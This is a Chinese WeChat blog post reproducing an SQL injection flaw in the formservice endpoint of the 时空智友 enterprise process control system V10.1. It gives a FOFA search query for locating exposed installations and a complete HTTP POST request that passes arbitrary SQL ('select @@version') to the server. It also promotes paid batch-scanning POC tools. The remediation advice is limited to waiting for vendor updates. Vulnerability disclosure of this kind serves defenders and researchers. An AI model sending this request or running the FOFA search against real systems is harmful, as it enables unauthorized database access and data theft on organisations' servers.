#  时空智友企业流程化管控系统formservice存在SQL注入漏洞   
南风徐来  南风漏洞复现文库   2024-04-21 23:05  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 时空智友企业流程化管控系统简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。  
## 2.漏洞描述  
  
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统formservice存在SQL注入漏洞  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
时空智友 V10.1  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3aN4tczl8Otal4ESxcwHlJ5zyYicT8XEVzwoF3312E4ibiacBr6LNzDiahA/640?wx_fmt=jpeg&from=appmsg "null")  
  
时空智友企业流程化管控系统formservice存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="企业流程化管控系统" || app="时空智友V10.1"  
## 5.漏洞复现  
  
漏洞链接：http://127.0.0.1/formservice?service=workflow.sqlResult  
  
漏洞数据包：  
```
POST /formservice?service=workflow.sqlResult HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Content-Type: application/json
Content-Length: 46

{"params":{"a":"11"},"sql":"select @@version"}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3M9UYFicaIRe0OiaoK4gzxNyS114LdMXqWeuWga07iaNjAU2uK0eQiaNUAg/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现128 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM33yl6e4reSic3ZdnnibicycdZz8ENbLrEbdiba9EFQhyZnnicUSKmvuMf5jw/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM32FH8ZQeZIEC2RH1ic2fe6IoWbAoUwibJDufrW8o2yjT9pwYbhrh0N3Zg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM356IwM0372RYVgWluAf5eNNXavOXC01XJUqYYncWHkMRsrbpHe0aWCw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM35iaNkcoKgdF1L1zicCX8eUx7jx03xeV51SiaTiaQkI3Bdlk7fzvTvYd53g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3g5RLL5K80xDV1PQUlvIFG0TJADd2WBuk2c6ynYLKnictsgaPqibfp1vA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3aBMkv7Hmu4bqwPZiaXlPLM3KC8jibv6wmD90BxcV9CmOgh19QbokJpAOlaJWlJkMNFFoysMfgQJib0w/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
请关注厂商更新 https://www.sxskzy.com/  
## 8.往期回顾  
  
  
[SpringBlade dict-biz/list接口存在SQL注入漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486270&idx=1&sn=42c4ed99574402368042d8c559a9ee64&chksm=974b8639a03c0f2f7c80478a0be180078d0ff486e35e86d17873045a4ccda5c59cb8ad191b96&scene=21#wechat_redirect)  
  
  
[IP-guard getdatarecord 存在任意文件读取](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486270&idx=2&sn=e247d509427a6801e6510bf68fc63eef&chksm=974b8639a03c0f2fb5ce022a44daf43debea3d521cefd6786d6ed5e7963b5c7732e99cd56576&scene=21#wechat_redirect)  
  
  
